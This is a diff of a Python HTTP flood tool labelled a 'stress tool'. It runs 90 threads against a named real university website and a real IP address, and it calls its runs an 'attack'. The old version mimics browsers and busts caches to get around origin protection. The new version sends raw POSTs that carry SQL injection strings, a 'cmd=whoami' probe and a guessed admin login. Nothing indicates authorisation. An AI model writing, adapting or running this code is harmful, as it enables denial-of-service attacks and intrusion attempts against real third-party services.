@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-stress.py - Raw HTTP GET/POST stress tool (Origin-bypass)
-Usage: python3 stress.py <target_url> <duration_seconds>
-Example: python3 stress.py https://www.ucv.edu.ph 90
+stress_rawpost.py - Raw TCP POST stress tool (Minimal headers)
+Usage: python3 stress_rawpost.py <target_ip> <port> <duration_seconds>
+Example: python3 stress_rawpost.py 202.91.160.10 80 90
 """
 
 import socket
@@ -12,9 +12,8 @@ import threading
 import time
 import sys
 import random
-import urllib.parse
 import platform
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 # ===== PLATFORM TWEAKS =====
 IS_WINDOWS = platform.system().lower() == "windows"
@@ -24,24 +23,23 @@ SOCKET_TIMEOUT = 8.0 if IS_WINDOWS else 5.0
 THREADS_PER_WORKER = 45   # 2 workers * 45 = 90 threads
 WORKER_COUNT = 2
 
-# Rotating headers to mimic real browsers
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+# Raw POST payloads (minimal, no extra headers)
+POST_PAYLOADS = [
+    b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\n\r\ntest",
+    b"POST /login HTTP/1.1\r\nHost: target\r\nContent-Length: 18\r\n\r\nuser=admin&pass=123",
+    b"POST /search HTTP/1.1\r\nHost: target\r\nContent-Length: 20\r\n\r\nq=union+select+1,2,3",
+    b"POST /api HTTP/1.1\r\nHost: target\r\nContent-Length: 16\r\n\r\n{\"key\":\"value\"}",
+    b"POST /submit HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\ndata=test",
+    b"POST /upload HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\n\r\n",
+    b"POST /cmd HTTP/1.1\r\nHost: target\r\nContent-Length: 12\r\n\r\ncmd=whoami",
+    b"POST /db HTTP/1.1\r\nHost: target\r\nContent-Length: 22\r\n\r\nquery=SELECT+*+FROM+users",
 ]
 
-class RawHTTPStress:
-    def __init__(self, url, duration):
-        self.parsed = urllib.parse.urlparse(url)
-        self.host = self.parsed.hostname
-        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
-        self.ssl = self.parsed.scheme == "https"
-        self.path = self.parsed.path or "/"
-        if self.parsed.query:
-            self.path += "?" + self.parsed.query
+class RawPOSTStress:
+    def __init__(self, host, port, duration, ssl_flag=False):
+        self.host = host
+        self.port = port
+        self.ssl_flag = ssl_flag
         self.duration = duration
         self.running = True
         self.total_requests = 0
@@ -49,25 +47,10 @@ class RawHTTPStress:
         self.lock = threading.Lock()
         self.start_time = None
 
-    def build_request(self):
-        ua = random.choice(USER_AGENTS)
-        # Random cache-buster every request
-        cache_buster = f"&_={random.randint(100000, 999999)}" if "?" in self.path else f"?_={random.randint(100000, 999999)}"
-        path_with_buster = self.path + cache_buster
-        headers = (
-            f"GET {path_with_buster} HTTP/1.1\r\n"
-            f"Host: {self.host}\r\n"
-            f"User-Agent: {ua}\r\n"
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-            f"Accept-Encoding: gzip, deflate, br\r\n"
-            f"Accept-Language: en-US,en;q=0.9\r\n"
-            f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-            f"Pragma: no-cache\r\n"
-            f"Expires: 0\r\n"
-            f"Connection: keep-alive\r\n"
-            f"\r\n"
-        )
-        return headers.encode()
+    def build_payload(self):
+        # Replace Host header with actual target
+        payload = random.choice(POST_PAYLOADS)
+        return payload.replace(b"target", self.host.encode())
 
     def create_socket(self):
         try:
@@ -76,7 +59,7 @@ class RawHTTPStress:
             if IS_WINDOWS:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
-            if self.ssl:
+            if self.ssl_flag:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
@@ -88,12 +71,12 @@ class RawHTTPStress:
             return None
 
     def send_request(self, sock):
-        req = self.build_request()
+        payload = self.build_payload()
         try:
-            sock.send(req)
-            sock.settimeout(1.0)
+            sock.send(payload)
+            sock.settimeout(0.5)
             try:
-                sock.recv(8192)
+                sock.recv(4096)
             except:
                 pass
             with self.lock:
@@ -143,39 +126,8 @@ class RawHTTPStress:
                 pass
 
     def run(self):
-        print(f"[+] Target: {self.parsed.scheme}://{self.host}:{self.port}{self.path}")
-        print(f"[+] Duration: {self.duration}s")
-        print(f"[+] Workers: {WORKER_COUNT} x {THREADS_PER_WORKER} threads = {WORKER_COUNT * THREADS_PER_WORKER} total")
-        print("[+] Starting stress... (Ctrl+C to stop early)\n")
-
+        print("[+] Attack sent (raw POST).")
         self.start_time = time.time()
-        # Launch attack in background thread so we can print live updates
-        attack_thread = threading.Thread(target=self._run_attack)
-        attack_thread.daemon = True
-        attack_thread.start()
-
-        # Print attack updates every 10 seconds
-        while attack_thread.is_alive():
-            time.sleep(10)
-            elapsed = time.time() - self.start_time
-            with self.lock:
-                reqs = self.total_requests
-                errs = self.errors
-            print(f"[ATTACK] {int(elapsed)}s | Requests: {reqs} | Errors: {errs} | Rate: {reqs/elapsed:.1f}/s")
-
-        # Final summary
-        elapsed = time.time() - self.start_time
-        with self.lock:
-            reqs = self.total_requests
-            errs = self.errors
-        print("\n[+] Attack finished.")
-        print(f"[+] Total requests sent: {reqs}")
-        print(f"[+] Total errors: {errs}")
-        if elapsed > 0:
-            print(f"[+] Requests/sec: {reqs / elapsed:.2f}")
-        print("[+] Stress complete.")
-
-    def _run_attack(self):
         with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
             futures = [executor.submit(self.worker_session, i) for i in range(WORKER_COUNT)]
             try:
@@ -184,20 +136,38 @@ class RawHTTPStress:
             except:
                 pass
 
+        elapsed = time.time() - self.start_time
+        with self.lock:
+            reqs = self.total_requests
+            errs = self.errors
+        print(f"[+] Attack finished.")
+        print(f"[+] Total requests sent: {reqs}")
+        print(f"[+] Total errors: {errs}")
+        if elapsed > 0:
+            print(f"[+] Requests/sec: {reqs / elapsed:.2f}")
+
 def main():
-    if len(sys.argv) < 3:
-        print("Usage: python3 stress.py <target_url> <duration_seconds>")
-        print("Example: python3 stress.py https://www.ucv.edu.ph 90")
+    if len(sys.argv) < 4:
+        print("Usage: python3 stress_rawpost.py <target_ip> <port> <duration_seconds>")
+        print("Example: python3 stress_rawpost.py 202.91.160.10 80 90")
+        print("Example: python3 stress_rawpost.py 202.91.160.10 443 90 --ssl")
         sys.exit(1)
 
-    url = sys.argv[1]
+    host = sys.argv[1]
     try:
-        duration = int(sys.argv[2])
+        port = int(sys.argv[2])
+    except ValueError:
+        print("[!] Port must be an integer")
+        sys.exit(1)
+    try:
+        duration = int(sys.argv[3])
     except ValueError:
         print("[!] Duration must be an integer (seconds)")
         sys.exit(1)
 
-    stress = RawHTTPStress(url, duration)
+    ssl_flag = "--ssl" in sys.argv
+
+    stress = RawPOSTStress(host, port, duration, ssl_flag)
     stress.run()
 
 if __name__ == "__main__":
